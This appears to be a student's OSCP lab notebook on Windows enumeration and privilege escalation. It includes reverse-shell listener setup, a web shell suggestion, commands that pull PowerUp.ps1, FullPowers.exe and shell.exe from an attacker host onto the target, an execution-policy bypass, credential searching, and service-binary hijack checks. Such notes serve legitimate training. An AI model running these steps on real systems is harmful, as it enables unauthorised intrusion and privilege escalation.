## Time Sync

Syncs our machine with the Domain server’s time as if we have more than a 5 min gap we will have issues./

```
sudo timedatectl set-ntp false
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `sudo ntpdate -s ${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
---
### The Technical Mapping

| **Linux Action**                      | **Windows Translation**                 | **Command/Tool**                                                                                                                                      |
| ------------------------------------- | --------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Web Exploits** (PHP/Python payload) | **Web Exploits** (.ASPX / .NET payload) | If you find a file upload on IIS, your standard `php-reverse-shell` won't work. You must upload a `.aspx` web shell (like the classic `cmdasp.aspx`). |

Upgrading Shell
```
powershell -ep bypass
```

or

```
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -ep bypass
```

ls
```
dir 
```


---
# Tree

```
tree /F /A
```

---

# WHOAMI /PRIV

whoami && id
```
whoami /priv 
```

```
whoami /groups
```

Look for dangerous privileges like `SeImpersonatePrivilege` (leads to instant Potato exploits) or `SeBackupPrivilege`.

if not working 

```
cd C:\Windows\System32>
```

```
whoami.exe /priv
```

---

The next piece of information we are interested in are other users and groups on the system. We can use the [_net user_](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771865\(v=ws.11\)) command or the [_Get-LocalUser_](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localuser?view=powershell-5.1) Cmdlet to obtain a list of all local users. Let's use the latter by starting PowerShell and running **Get-LocalUser**.

```
net group /domain
```

```
net group "Domain Admins" /domain
```

```
Get-LocalGroup
```

![[Pasted image 20260902195443.png]]

---

```
Get-LocalGroupMember adminteam
```

![[Pasted image 20260902195507.png]]

---

# CAT /ETC/PASSWD

`cat /etc/passwd` 

**C:\Windows\System32\drivers\etc\hosts**

Lists all local accounts and who belongs to the high-privilege groups.

```
net user 
```

```
net localgroup administrators
```

---

# PS AUX

`ps aux` (Look for root processes)
```
tasklist /v
```

```
Get-Process
```

Look for third-party software running as `SYSTEM` (like an old antivirus, backup software, or web server).

---
# SS -TLPN

```
netstat -ano | findstr LISTENING
```


---

# Restart Windows Machine

```
shutdown /r /t 0
```

# Privilege Escalation Diagnostics

## 1. Check Service Configuration

Display the service configuration, including executable path, startup type and service account.

```
sc.exe qc GPGOrchestrator
```

**Important fields:**

- `BINARY_PATH_NAME` – executable launched by the service.
- `START_TYPE` – whether the service starts automatically.
- `SERVICE_START_NAME` – account running the service.

```
BINARY_PATH_NAME:
"C:\Program Files\MilleGPG5\GPGService.exe"

START_TYPE:
2 AUTO_START

SERVICE_START_NAME:
LocalSystem
```

## 2. Check Service Status

```
sc.exe query GPGOrchestrator
```

Check whether the service is running, stopped or stuck starting.

Possible states:

- `RUNNING`
- `STOPPED`
- `START_PENDING`

## 3. Check Service Using PowerShell

```
Get-Service GPGOrchestrator
```
Displays the service status and name.

## 4. Check Executable File Information

```
Get-Item "C:\Program Files\MilleGPG5\GPGService.exe" |
Select-Object Name, Length, LastWriteTime
```

Useful for checking:

- Filename
- File size
- **Last modification timestamp**

## 5. Check Executable and Directory Permissions

```
icacls "C:\Program Files\MilleGPG5\GPGService.exe"
```

Check permissions on the parent directory:

```
icacls "C:\Program Files\MilleGPG5"
```

Look for permissions such as:

- `(F)` – Full control
- `(M)` – Modify
- `(W)` – Write
- `(RX)` – Read and execute

Pay particular attention to permissions assigned to `BUILTIN\Users` or `Authenticated Users`.

## 6. Check Windows Service Errors

Retrieve the latest 15 Service Control Manager events:

```
Get-WinEvent -FilterHashtable @{
    LogName = 'System'
    ProviderName = 'Service Control Manager'
} -MaxEvents 15 | Format-List TimeCreated, Id, Message
```

Retrieve the latest 20 events:

```
Get-WinEvent -FilterHashtable @{
    LogName = 'System'
    ProviderName = 'Service Control Manager'
} -MaxEvents 20 | Select-Object TimeCreated, Id, Message
```

### Relevant Event ID

|Event ID|Meaning|
|---|---|
|7000|Service failed to start|
|7009|Service connection timeout|
|7011|Service control request timeout|

Event ID 7000 can indicate that the service failed to complete its startup process. It does not independently establish whether the executable ran.

---

## 7. Kali Listener Diagnostics

Check whether the intended callback port is already occupied:

```
sudo ss -lntp
```

Check a particular port, for example 135:

```
sudo ss -lntp | grep ':135'
```

Start a Netcat listener:

```
nc -lvnp 135
```

The listener port must match the payload's configured callback port.

## 8. Kali HTTP Server Diagnostics

Start an HTTP server in the directory containing the payload:

```
python3 -m http.server 8080
```

The target downloads the payload from:

```
http://192.168.45.178:8080/shell.exe
```

Check the HTTP server output for a successful GET request.

---

## Troubleshooting Checklist

- Confirm GPGOrchestrator points to `GPGService.exe`.
    
- Confirm the service runs as `LocalSystem`.
    
- Confirm the service startup type.
    
- Verify the replacement executable's file information.
    
- Check file and directory permissions.
    
- Check Windows Service Control Manager errors.
    
- Confirm the payload architecture matches the target.
    
- Confirm the payload callback IP and port.
    
- Confirm the Kali listener is running on the matching port.
    
- Check whether the HTTP server recorded a successful download.
    

## Key Concepts

|Component|Purpose|
|---|---|
|GPGOrchestrator|Windows service|
|GPGService.exe|Executable associated with GPGOrchestrator|
|LocalSystem|Highly privileged Windows service account|
|Port 8080|HTTP payload download|
|Callback port|Reverse-shell connection|
|Event ID 7000|Service startup failure|

**Important:** A service startup failure does not necessarily mean the replacement executable never ran. Check the listener and event logs independently.
# Step 1 : Transfer PowerUp.ps1 from KALI ATTACKER to WINDOWS TARGET

On KALI ATTACKER
```
cd ~/Desktop/Tools/Windows && python -m http.server 80
```

# Step 2 : On WINDOWS TARGET: Powershell (MODIFY OUTFILE DESTINATION)
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `powershell wget http://${KaliIP}/PowerUp.ps1 -OutFile C:\\\Users\\\mike\\\Desktop\\\PowerUp.ps1`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}/PowerUp.ps1 PowerUp.ps1`;

dv.paragraph("```bash\n" + command + "\n```");
```
```powershell
. .\PowerUp.ps1; Invoke-AllChecks
```

---

```
sc.exe qc [servicename]
```

```
icacls [servicename]
```

Check startup
```
Get-WinEvent -FilterHashtable @{
    LogName = 'System'
    ProviderName = 'Service Control Manager'
} -MaxEvents 15 | Format-List TimeCreated, Id, Message
```

Example output
```powershell
sc.exe qc VeyonService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VeyonService
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\Ela Arwel\Veyon\veyon-service.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Veyon Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

Autostart means reboot system to work
LocalSystem > Run as Root

[[Hijack EXE]]

---
# Windows Admin Creds Search

Windows Admin Creds Search
```
findstr /SIM /C:"pass" *.ini *.cfg *.xml
```

---


CHECK
C:\xampp\htdocs

# NT AUTHORITY/LOCAL FULLPOWERS

If entering NT AUTHORITY/LOCAL, Use [[FullPowers]]

```
cd ~/Desktop/Tools/Windows && python -m http.server 80
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `powershell -c "iwr -uri http://${KaliIP}/FullPowers.exe -OutFile FullPowers.exe"`;

dv.paragraph("```bash\n" + command + "\n```");
```

```
./FullPowers.exe
```

New privileges should be enabled

```
whoami /priv
```

[[SeImpersonatePrivilege]]
[[SeRestorePrivilege]]
[[SeBackupPrivilege]]

# Search flags

```
cd C:\
```

```
dir /s /b local.txt
```

```
dir /s /b proof.txt
```

```
type proof.txt
```

---

Delete a file
```
del filename.txt
```

```
del /f filename.txt
```

```powershell
Remove-Item filename.txt
```

```powershell
Remove-Item filename.txt -Force
```